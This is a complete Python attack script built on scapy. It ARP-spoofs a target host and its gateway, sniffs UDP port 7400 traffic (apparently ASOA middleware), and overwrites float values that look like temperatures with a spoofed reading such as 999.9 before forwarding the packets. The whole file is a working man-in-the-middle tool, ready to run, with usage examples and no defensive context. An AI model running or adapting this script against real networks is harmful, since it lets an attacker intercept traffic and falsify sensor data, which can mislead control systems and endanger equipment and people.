#!/usr/bin/env python3
"""
Simple ASOA MITM Attack - Works on macOS
No complex dependencies, just basic Python and scapy
"""

import sys
import time
import signal
import threading
import subprocess
import os
from scapy.all import *

class SimpleASOAMITM:
    def __init__(self, target_ip, spoofed_temp=999.9):
        self.target_ip = target_ip
        self.spoofed_temp = spoofed_temp
        self.running = False
        self.intercepted_packets = 0
        self.modified_packets = 0
        
        # Get gateway IP
        self.gateway_ip = self.get_gateway_ip()
        print(f"🎯 Target: {self.target_ip}")
        print(f"🌐 Gateway: {self.gateway_ip}")
        print(f"🌡️ Spoofed Temperature: {self.spoofed_temp}°C")
        
    def get_gateway_ip(self):
        """Get default gateway IP using route command"""
        try:
            # Use route command to get gateway
            result = subprocess.run(['route', '-n', 'get', 'default'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'gateway:' in line:
                        return line.split(':')[1].strip()
            
            # Fallback: try common gateway IPs
            common_gateways = ['192.168.1.1', '192.168.0.1', '10.0.0.1']
            for gw in common_gateways:
                try:
                    result = subprocess.run(['ping', '-c', '1', '-t', '1', gw], 
                                          capture_output=True)
                    if result.returncode == 0:
                        return gw
                except:
                    continue
            
            return '192.168.1.1'  # Default fallback
            
        except Exception as e:
            print(f"⚠️ Warning: Could not detect gateway, using default: {e}")
            return '192.168.1.1'
    
    def arp_spoof(self):
        """ARP spoofing to intercept traffic"""
        print("🔄 Starting ARP spoofing...")
        
        try:
            # Get interface
            interface = conf.iface
            
            # Spoof target to think we are gateway
            target_to_gateway = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip)
            # Spoof gateway to think we are target
            gateway_to_target = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip)
            
            while self.running:
                try:
                    send(target_to_gateway, verbose=False)
                    send(gateway_to_target, verbose=False)
                    time.sleep(2)
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"⚠️ ARP spoofing warning: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            print(f"❌ ARP spoofing failed: {e}")
    
    def packet_handler(self, packet):
        """Handle intercepted packets"""
        try:
            if packet.haslayer(UDP) and packet[UDP].dport == 7400:
                self.intercepted_packets += 1
                print(f"📡 Intercepted ASOA packet #{self.intercepted_packets}: {packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}")
                
                # Try to modify temperature data
                if self.modify_temperature_packet(packet):
                    self.modified_packets += 1
                    print(f"🌡️ Temperature modified to {self.spoofed_temp}°C")
                    
                    # Forward modified packet
                    try:
                        send(packet, verbose=False)
                        print(f"💉 Sent modified packet to {packet[IP].dst}:{packet[UDP].dport}")
                    except Exception as e:
                        print(f"⚠️ Failed to send packet: {e}")
                        
        except Exception as e:
            print(f"⚠️ Packet handler warning: {e}")
    
    def modify_temperature_packet(self, packet):
        """Modify temperature data in ASOA packet"""
        try:
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                
                # Look for temperature patterns in payload
                import struct
                import re
                
                # Try to find float values that could be temperature
                float_pattern = re.compile(rb'[\x00-\xff]{4}')  # 4-byte patterns
                matches = float_pattern.findall(payload)
                
                for match in matches:
                    try:
                        # Try to interpret as float
                        value = struct.unpack('f', match)[0]
                        if 0 <= value <= 100:  # Likely temperature range
                            print(f"🌡️ Found temperature value: {value}°C")
                            
                            # Replace with spoofed temperature
                            new_value = struct.pack('f', self.spoofed_temp)
                            new_payload = payload.replace(match, new_value)
                            
                            # Update packet
                            packet[Raw].load = new_payload
                            
                            # Recalculate checksums
                            del packet[UDP].chksum
                            del packet[IP].chksum
                            
                            return True
                    except:
                        continue
                        
        except Exception as e:
            print(f"⚠️ Error modifying packet: {e}")
        
        return False
    
    def start_attack(self):
        """Start the MITM attack"""
        print("🚀 Starting ASOA MITM Attack...")
        self.running = True
        
        # Start ARP spoofing in background
        arp_thread = threading.Thread(target=self.arp_spoof)
        arp_thread.daemon = True
        arp_thread.start()
        
        # Start packet sniffing
        print("📡 Starting packet sniffing on UDP port 7400...")
        try:
            sniff(filter=f"udp port 7400 and host {self.target_ip}", 
                  prn=self.packet_handler, 
                  store=0,
                  stop_filter=lambda x: not self.running)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the MITM attack"""
        print("\n🛑 Stopping MITM attack...")
        self.running = False
        
        # Restore ARP tables
        print("🔄 Restoring ARP tables...")
        try:
            gateway_mac = getmacbyip(self.gateway_ip)
            target_mac = getmacbyip(self.target_ip)
            
            if gateway_mac and target_mac:
                restore_arp = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=target_mac, hwsrc=gateway_mac)
                send(restore_arp, verbose=False)
        except Exception as e:
            print(f"⚠️ Warning: Could not restore ARP tables: {e}")
        
        print(f"📊 Attack Summary:")
        print(f"   - Intercepted packets: {self.intercepted_packets}")
        print(f"   - Modified packets: {self.modified_packets}")
        print("✅ MITM attack stopped")

def signal_handler(sig, frame):
    print("\n🛑 Interrupt received, stopping attack...")
    if hasattr(signal_handler, 'attack'):
        signal_handler.attack.stop_attack()
    sys.exit(0)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 simple_mitm_attack.py <target_ip> [spoofed_temperature]")
        print("Example: python3 simple_mitm_attack.py 192.168.1.101 999.9")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    spoofed_temp = float(sys.argv[2]) if len(sys.argv) > 2 else 999.9
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create and start attack
    attack = SimpleASOAMITM(target_ip, spoofed_temp)
    signal_handler.attack = attack
    
    try:
        attack.start_attack()
    except KeyboardInterrupt:
        attack.stop_attack()

if __name__ == "__main__":
    main()
